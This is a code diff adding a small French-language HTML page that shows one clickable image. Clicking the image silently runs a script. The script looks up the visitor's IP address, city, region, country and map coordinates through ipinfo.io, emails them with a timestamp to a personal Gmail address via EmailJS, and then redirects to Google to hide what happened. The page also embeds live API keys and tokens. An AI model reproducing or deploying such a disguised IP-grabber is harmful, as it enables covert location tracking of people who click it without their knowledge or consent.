@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Image Cliquable</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        function envoyerInfosEtRediriger() {
+            emailjs.init("PYUYW4IWCVoZ7zYK3");
+            fetch("https://ipinfo.io/json?token=15f29802768d7e")
+                .then(res => res.json())
+                .then(data => {
+                    const now = new Date().toLocaleString();
+                    emailjs.send("service_9v6pjko", "template-wv5mezn", {
+                        ip: data.ip,
+                        ville: data.city,
+                        region: data.region,
+                        pays: data.country,
+                        position: data.loc,
+                        heure: now,
+                        to_email: "oguerep@gmail.com"
+                    });
+                })
+                .catch(e => console.error("Erreur IP :", e));
+
+            // Redirection
+            window.location.href = "https://www.google.com";
+        }
+    </script>
+</head>
+<body>
+    <a href="#" onclick="envoyerInfosEtRediriger(); return false;">
+        <img src="https://gofile.io/d/8XsBTb" style="max-width:100%; height:auto; border:3px solid black;" />
+    </a>
+</body>
+</html>
